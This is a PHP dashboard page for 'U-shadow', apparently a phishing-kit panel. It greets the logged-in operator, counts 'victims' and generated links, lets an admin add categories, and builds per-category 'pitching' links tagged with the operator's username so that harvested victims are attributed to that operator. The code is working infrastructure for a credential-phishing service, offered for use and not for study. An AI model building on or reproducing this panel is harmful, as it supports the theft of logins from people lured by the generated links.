<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
$user = $_SESSION['user'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Dashboard</title>
    <link rel="stylesheet" href="public/css/style.css">
</head>
<body>

<header>
    <div class="logo">U-SHADOW</div>
</header>

<div style="text-align: center;">
    <a href="#" class="telegram-btn">Join Our Telegram</a>
</div>

<nav>
    <ul>
        <li><a href="index.php">Home</a></li>
        <li><a href="signup.php">Sign Up</a></li>
        <li><a href="#">Short Your Link</a></li>
        <li><a href="#">Facebook</a></li>
        <li><a href="#">Contact</a></li>
        <li><a href="logout.php">Logout</a></li>
    </ul>
</nav>

<div class="main-container">
    <div class="victimes-control">
        <div class="panel-header">.: Dashboard :.</div>
        <div class="panel-body">
            <p>Welcome back, <strong><?php echo htmlspecialchars($user['username']); ?></strong>!</p>
            <?php if (isset($user['is_admin']) && $user['is_admin']): ?>
                <p><strong>Admin Panel:</strong> <a href="admin_categories.php">Create New Category</a></p>
            <?php endif; ?>
            <p>You can now access your victims and manage your account.</p>
            <div style="border: 1px solid #ddd; padding: 20px; background-color: #f9f9f9;">
                <h3>Your Statistics</h3>
                <p>Victims: 0</p>
                <p>Links generated: 0</p>
            </div>

            <hr>
            <h3>Generate Links</h3>
            <p>Select a category to generate your pitching link:</p>
            <div style="display: flex; flex-wrap: wrap; gap: 10px;">
                <?php
                $categories = json_decode(file_get_contents('categories.json'), true);
                foreach ($categories as $cat):
                    $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/" . strtolower($cat) . ".php?user=" . urlencode($user['username']);
                ?>
                    <div style="border: 1px solid #ccc; padding: 10px; background: #fff; width: 200px;">
                        <strong><?php echo htmlspecialchars($cat); ?></strong><br>
                        <input type="text" value="<?php echo htmlspecialchars($generated_link); ?>" style="width: 100%; font-size: 10px; margin-top: 5px;" readonly onclick="this.select()">
                    </div>
                <?php endforeach; ?>
            </div>
            <p><a href="logout.php">Logout</a></p>
        </div>
    </div>
</div>

<div class="footer">
    Copyright 2010-2025 | This Website Is Developed By K24KDX <br>
    U-shadow v2.3 ©
</div>

</body>
</html>
